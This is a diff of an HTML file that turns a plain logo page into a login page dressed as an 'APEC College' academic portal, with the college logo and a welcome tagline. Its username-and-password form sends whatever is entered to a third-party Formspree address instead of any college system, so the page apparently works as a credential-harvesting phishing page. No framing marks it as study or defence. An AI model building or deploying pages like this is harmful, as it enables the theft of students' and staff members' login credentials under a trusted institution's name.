@@ -1,30 +1,90 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>A.P.S.E.C Logo</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>APEC College Login</title>
 
-    <style>
-        body{
-            margin:0;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            height:100vh;
-            background:#fff;
-        }
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #e9eef5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-        img{
-            width:400px;
-            max-width:100%;
-            height:auto;
-        }
-    </style>
+    .login-box {
+      background: #fff;
+      padding: 25px;
+      width: 340px;
+      text-align: center;
+      border-radius: 12px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.15);
+    }
+
+    .login-box img {
+      width: 90px;
+      margin-bottom: 10px;
+    }
+
+    .login-box h2 {
+      margin: 10px 0;
+      color: #1a237e;
+    }
+
+    .login-box input {
+      width: 90%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .login-box button {
+      width: 95%;
+      padding: 10px;
+      background: #1a237e;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-box button:hover {
+      background: #0d1440;
+    }
+
+    .tagline {
+      font-size: 13px;
+      color: gray;
+      margin-bottom: 10px;
+    }
+  </style>
 </head>
+
 <body>
 
-<img src="logo.png" alt="A.P.S.E.C Logo">
+  <div class="login-box">
+
+    <!-- Upload your APEC logo as logo.png in GitHub repo -->
+    <img src="logo.png" alt="APEC College Logo">
+ 
+
+    <h2>APEC College Login</h2>
+    <p class="tagline">Welcome to Academic Portal</p>
+
+    <form action="https://formspree.io/f/xdarpbvo" method="POST">
+      <input type="text" name="username" placeholder="Enter Username" required>
+      <input type="password" name="password" placeholder="Enter Password" required>
+      <button type="submit">Login</button>
+    </form>
+
+  </div>
 
 </body>
 </html>
